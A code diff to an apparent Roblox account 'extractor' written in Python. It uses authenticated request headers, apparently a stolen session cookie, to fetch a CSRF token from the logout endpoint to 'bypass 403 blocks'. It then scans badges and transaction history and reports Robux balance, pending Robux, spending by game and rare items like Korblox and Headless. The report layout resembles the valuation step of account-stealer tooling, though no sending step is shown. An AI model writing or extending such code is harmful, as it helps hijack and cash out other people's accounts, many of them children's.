@@ -18,6 +18,18 @@ def safe_get(url, headers=None):
         pass
     return None
 
+def get_csrf_token(headers):
+    """Fetch Roblox X-CSRF-Token required for economy & transaction endpoints"""
+    try:
+        req = urllib.request.Request("https://auth.roblox.com/v1/logout", data=b"", headers=headers, method="POST")
+        with urllib.request.urlopen(req, timeout=5) as res:
+            pass
+    except urllib.error.HTTPError as e:
+        return e.headers.get("x-csrf-token", "")
+    except Exception:
+        pass
+    return ""
+
 def main():
     try:
         print("DEBUG: Python Extractor started", file=sys.stderr)
@@ -53,6 +65,11 @@ def main():
             "Accept": "application/json, text/plain, */*"
         }
 
+        # Inject CSRF Token to bypass 403 blocks on economy/transaction endpoints
+        csrf_token = get_csrf_token(headers)
+        if csrf_token:
+            headers["X-CSRF-Token"] = csrf_token
+
         user_data = safe_get("https://users.roblox.com/v1/users/authenticated", headers)
         
         username = "Unknown User"
@@ -65,8 +82,12 @@ def main():
         has_korblox = False
         has_headless = False
 
-        # Gamepass / Purchase Counters
-        adopt_me_passes = 0
+        # Game-specific tracking (e.g., Adopt Me Universe ID: 383310974)
+        ADOPT_ME_UNIVERSE = 383310974
+        played_adopt_me = False
+        adopt_me_spent = 0
+        adopt_me_passes_count = 0
+
         mm2_passes = 0
         ps99_passes = 0
 
@@ -93,13 +114,32 @@ def main():
             if totals_data:
                 pending_robux = totals_data.get("pendingRobux", 0)
 
-            # Scan Transaction History to count gamepass/item purchases per game
+            # --- 1. Check Badges for Adopt Me Playtime Verification ---
+            badge_cursor = ""
+            for _ in range(3): # Check recent pages of badges
+                badge_url = f"https://badges.roblox.com/v1/users/{user_id}/badges?limit=100"
+                if badge_cursor:
+                    badge_url += f"&cursor={badge_cursor}"
+                badge_res = safe_get(badge_url, headers)
+                if not badge_res or "data" not in badge_res:
+                    break
+                for b in badge_res["data"]:
+                    if b.get("awardingUniverse", {}).get("id") == ADOPT_ME_UNIVERSE:
+                        played_adopt_me = True
+                        break
+                if played_adopt_me:
+                    break
+                badge_cursor = badge_res.get("nextPageCursor")
+                if not badge_cursor:
+                    break
+
+            # --- 2. Scan Purchases & Universe Spending ---
             one_year_ago = datetime.now(timezone.utc) - timedelta(days=365)
-            cursor = ""
+            tx_cursor = ""
             for _ in range(3): # Scan up to 300 recent transactions
-                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchases&limit=100"
-                if cursor:
-                    tx_url += f"&cursor={cursor}"
+                tx_url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?transactionType=Purchase&limit=100"
+                if tx_cursor:
+                    tx_url += f"&cursor={tx_cursor}"
                 tx_data = safe_get(tx_url, headers)
                 if not tx_data or "data" not in tx_data:
                     break
@@ -113,24 +153,25 @@ def main():
                             if amount < 0:
                                 total_spent_past_year += abs(amount)
 
-                            # Check item details name for game matches
-                            details = tx.get("details", {})
-                            item_name = str(details.get("name", "")).lower()
-                            
-                            # Count gamepass / item occurrences
-                            if any(k in item_name for k in ["adopt me", "ride potion", "fly potion", "vip adopt"]):
-                                adopt_me_passes += 1
-                            if any(k in item_name for k in ["mm2", "murder mystery", "godly mm2", "knife mm2"]):
-                                mm2_passes += 1
-                            if any(k in item_name for k in ["pet simulator", "ps99", "exclusive pet", "huge pet"]):
-                                ps99_passes += 1
-                        else:
-                            break
+                        # Check if transaction belongs to Adopt Me Universe
+                        place_info = tx.get("details", {}).get("place", {})
+                        if place_info.get("universeId") == ADOPT_ME_UNIVERSE:
+                            adopt_me_spent += abs(tx.get("currency", {}).get("amount", 0))
+                            if tx.get("details", {}).get("type") == "GamePass":
+                                adopt_me_passes_count += 1
+
+                        # General item name checks for MM2 / PS99
+                        details = tx.get("details", {})
+                        item_name = str(details.get("name", "")).lower()
+                        if any(k in item_name for k in ["mm2", "murder mystery", "godly mm2", "knife mm2"]):
+                            mm2_passes += 1
+                        if any(k in item_name for k in ["pet simulator", "ps99", "exclusive pet", "huge pet"]):
+                            ps99_passes += 1
                     except Exception:
                         continue
                 
-                cursor = tx_data.get("nextPageCursor")
-                if not cursor:
+                tx_cursor = tx_data.get("nextPageCursor")
+                if not tx_cursor:
                     break
 
             # Korblox & Headless Check
@@ -155,14 +196,16 @@ def main():
                     f"👤 **Username**\n`{username}`\n\n"
                     f"📈 **Account Stats**\n"
                     f"> • Account Age: `{account_age_days} Days`\n"
+                    f"> • Played Adopt Me: `{'Yes' if played_adopt_me else 'No'}`\n"
                     f"> • Past 1 Year Spent: `{total_spent_past_year} 🪙`\n\n"
                     f"🪙 **Robux Balance & Pending**\n"
-                    f"> • Balance: `{robux_balance} 🪙`\n"
-                    f"> • Pending: `{pending_robux} 🪙`\n\n"
-                    f"🎮 **Gamepass Purchases Count**\n"
-                    f"> • Adopt Me Gamepasses/Items: `{adopt_me_passes}`\n"
-                    f"> • MM2 Gamepasses/Items: `{mm2_passes}`\n"
-                    f"> • PS99 Gamepasses/Items: `{ps99_passes}`\n\n"
+                    f"> • Balance: `{robux_balance:,} 🪙`\n"
+                    f"> • Pending: `{pending_robux:,} 🪙`\n\n"
+                    f"🎮 **Gamepass & Universe Activity**\n"
+                    f"> • Adopt Me Spent: `{adopt_me_spent} 🪙`\n"
+                    f"> • Adopt Me Passes: `{adopt_me_passes_count}`\n"
+                    f"> • MM2 Items: `{mm2_passes}`\n"
+                    f"> • PS99 Items: `{ps99_passes}`\n\n"
                     f"🎒 **Inventory Items**\n"
                     f"> • Korblox: `{str(has_korblox)}`\n"
                     f"> • Headless: `{str(has_headless)}`\n\n"
